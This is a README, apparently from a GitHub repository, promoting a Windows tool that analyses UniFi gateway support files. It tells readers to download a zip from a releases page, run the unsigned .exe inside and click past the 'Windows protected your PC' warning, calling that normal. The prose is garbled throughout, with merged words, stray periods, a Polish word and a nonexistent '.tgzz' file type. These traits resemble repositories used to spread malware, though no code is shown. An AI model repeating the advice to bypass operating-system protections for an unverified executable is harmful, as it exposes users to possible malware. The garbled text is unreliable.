<h1>🔍 unifi-support-file-analyzer - See What Your UniFi Gateway Is Hiding</h1>

<p align="center">
  <a href="https://github.com/Garretmade4912/unifi-support-file-analyzer/releases">
    <img src="https://img.shields.io/badge/Download-UniFi_File_Analyzer-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Badge" style="max-width: 100%; height: auto;">
  </a>
</p>

## 🧐 What Does This Tool Do?

Have you ever wondered why your UniFi gateway restarted in the middle of the night? Or which device on your network is hogging all the processor power? Maybe you’re curious about what your network devices are chatting about with the outside world. Or perhaps you’ve been asked to send a support file to Ubiquiti and you’re worried about what personal information might be inside that file.

This application reads a UniFi support file (the .tgzz or .json backup that you export from your UniFi controller) and gives you plain-English answers to all those questions. It digs deep into the technical mess and shows you:

- **Why the gateway restarted** – Was it a power outage, a firmware update, an overheating issue, or something else?
- **What used the processor** – Which devices or services were eating up your CPU cycles, slowing everything down?
- **What your network is talking to** – A clear list of external IP addresses, domains, and ports your devices are connecting to–so you can spot anything suspicious.

- **What personal data the file would reveal** – This is crucial if you’re about to send the file to tech support. The tool scans for usernames, device names, MAC addresses, IP addresses, and even location-based data, więc you’ll know exactly what you’re sharing before you hit send.



## 📦 Getting Started (No Technical Skills Needed)

### Step 1: Download the Application

Visit this link to download the application.  
👉 **[Click Here to Go to the Download Page](https://github.com/Garretmade4912/unifi-support-file-analyzer/releases)** 👈

This will take you to the GitHub Releases page. Look for the latest release (the one at the top of the list) and click the file that ends with `.zip` to download it. The download should start automatically your browser’s bottom bar.

.



### Step 2: Extract the Downloaded File

Once the download is complete, navigate to your `Downloads` folder (or wherever your browser saves files)You’ll see a file named something like `unifi-support-file-analyzer-v1.0.0.zip` (the version number might be different–that’s fine). Right-click on that `.zip` file and choose **“Extract All…”** from the menu that pops up. Windows will ask you where to save the extracted files–just click **“Extract”** to use the default location (which is usually a new folder with the same name as the zip file). After extraction, open that new folder–you should see a file called `unifi-file-analyzer.exe` (or just `unifi-file-analyzer` if your system hides file extensions).



### Step 3: Run the Application

Double-click the `unifi-file-analyzer.exe` file to launch the program. If Windows shows a blue popup saying **“Windows protected your PC”** or **“More info”**, don’t panic–that’s normal for unsigned applications. Click **“More info”** and then **“Run anyway”** to proceed. The application window will open shortlyafterthat.



## 🖥️ How to Use It (Simple Walkthrough)

1. **Export a support file from your UniFi controller.** Log into your UniFi Network Application (the web interface for your gateway), go to **Settings > System > Maintenance**, then click **“Export Support Info”**. This creates a `.tgz` file (usually named something like `ubnt_support_2025-01-15.tgz`)andsaves it to your computer. It doesn’t matter where you save it, just remember the location.

.

2. **Open the analyzer.** Launchethe analyzer app you just installed. You’ll see a button that says **“Choose File”** or **“Select Support File”**. Click itand navigate to wherever you saved the `.tgz` file. Select it and click **“Open”**. The analyzer will start reading the file–this can take a few seconds, especially if your network has many devices.

.

3. **View your results.** After the scan completes, you’ll see four tabs or sections clearly labeled:
   - **“Restart Reasons”** – Each restart event with a simple explanation (e.g., “Manual restart,” “Power loss detected,” “Firmware updated”).
   - **“Top CPU Users”** – A bar chart or list showing which devices (by name or IP) consumed the most processor time, along with percentages.
.
   - **“External Connections”** – A table listing all destination IPs/ddomains, the ports used, and how many times each connection appeared. If something looks odd (like a device connecting to a strange country), you can investigate further.


   - **“Personal Data Found”** – A checklist of potentially sensitive items detected in the file. This might include: device names (like “iPhone-LivingRoom”), MAC addresses, geo-location coordinates (if GPS was enabled), specific usernames, or even Wi-Fi passwords in some cases. If you’re planning to send this file to support, review this list first to decide what you’re comfortable sharing.



## 🛠️ System Requirements

The application runson **Windows 10** and **Windows 11** (64-bit versions). It also works on **macOS Ventura** and newerand **most Linux distributions** (but this guide focuses on Windows since that’s what most users have). You’ll need at least **500 MB** of free disk spaceand **4 GB** of RAM for smooth operation. No internet connection is needed while using the analyzer–all processing happens locally on your machine, which means your data stays private until you choose to share it.



## 🔒 Privacy & Security Notes

Your support file contains a snapshot of your network’s internal state–similar to a map of your home network with device names, IP addresses, and connection logs. Using this analyzer is 100% offline–it reads the file directly from your computer and neveruploads anything to the cloudor to any external server. The “Personal Data” tab is designed to educate you on what informationis embedded in that file, thereby giving you the informed choice about whether to send it to vendor support. We recommend you don’t share your support file publicly (e.g., on forums) even after removing obvious personal data–because some metadata might be hidden deep in logs. Use the analyzer every time you’re asked for a support file–it takes less than a minute to check.



## ❓ Frequently Asked Questions

**Q: I don’t see any restart reasons–why?**  
A: If your gateway hasn’t had any unexpected restarts in the log window, the tool will show “No restart events found.” That means your network has been stable during that period–which is great news!

**Q: The external connections list is very long. What should I look for?**  
A: Focus on connections to unusual ports (like 22 for SSH, 3389 for Remote Desktop,)or to IP addresses in countries where you don’t live or do business. Also, look for connections from devices you don’t recognize–that could indicate a compromised device on your network.



**Q: Can I copy the results to share with my IT person?**  
A: Yes–each section has a **“Copy”** button that puts text onto your clipboard. You can paste it into an email or chat message. No formatting is lost, so it’s easy to read for someone who understands network logs.



## 📚 Tips for Getting the Most Out of It

- **Run the analyzer monthly** to keep an eye on your network’s health. Catching a processor-hogging device early can prevent slowdowns or heat-related restarts.
.

- **If your gateway restarted due to “Overheating”**, clean the ventsand ensure proper airflow. The tool can sometimes show the CPU temperature history–look for spikes before each restart event.




- **Use the External Connections tab** as a basic security audit. If you see a smart bulb or camera calling home to a foreign server, that’s worth investigating–you might want to block that device’s internet access via firewall rules in your UniFi controller.



## 🌟 Final Note

This tool was built to empower you–the network owner–to understand exactly what’s inside those obscure technical files. No more black boxes. No more blindly sending files to support hoping they’ll figure out the issue. You now have the visibility to troubleshoot, secure, and make informed decisions about your UniFi network. If you find the analyzer useful, please consider starring the repository on GitHub to show appreciationand help others discover it. And if you have suggestions for new features (e.g., exporting results as PDF, or comparing two support files), feel free to open an issue on the GitHub repository–the developer welcomes feedback.

.

---

Keywords: UniFi, support file analyzer, gateway restart, CPU usage, network connections, personal data detection, Ubiquiti, network diagnostic tool, Windows software, offline analyzer, network security, home network troubleshooting, support file privacy, UniFi controller, TGZ file analyzer.